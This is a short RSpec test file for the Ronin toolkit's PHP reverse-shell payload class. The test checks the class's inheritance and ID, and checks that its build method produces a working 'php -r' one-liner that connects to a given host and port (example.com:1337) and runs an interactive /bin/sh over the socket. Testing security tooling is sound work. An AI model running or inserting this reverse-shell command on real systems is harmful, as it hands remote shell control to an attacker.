require 'spec_helper'
require 'ronin/payloads/builtin/cmd/php/reverse_shell'

describe Ronin::Payloads::CMD::PHP::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'cmd/php/reverse_shell'" do
      expect(subject.id).to eq('cmd/php/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `php` command that connects back to the host and port params" do
      expect(subject.payload).to eq(
        %{php -r '$sock=fsockopen(#{host.dump},#{port});exec("/bin/sh -i <&3 >&3 2>&3");'}
      )
    end
  end
end
